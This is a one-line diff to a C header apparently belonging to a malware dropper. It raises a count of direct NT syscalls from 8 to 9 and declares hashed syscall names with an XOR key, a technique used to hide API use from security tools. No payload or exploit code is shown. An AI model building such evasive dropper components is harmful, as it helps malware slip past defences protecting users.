@@ -1,7 +1,7 @@
 #ifndef __PRIVATE_DROPPER_NTAPISYSCALLS_BASIC_H
 #define __PRIVATE_DROPPER_NTAPISYSCALLS_BASIC_H
 
-#define NtapiSyscallsFunctionsCount 8
+#define NtapiSyscallsFunctionsCount 9
 
 extern CONST VOLATILE DWORD NtapiSyscallsNamesHashXorKey;
 extern DWORD NtapiSyscallsNamesHash[];
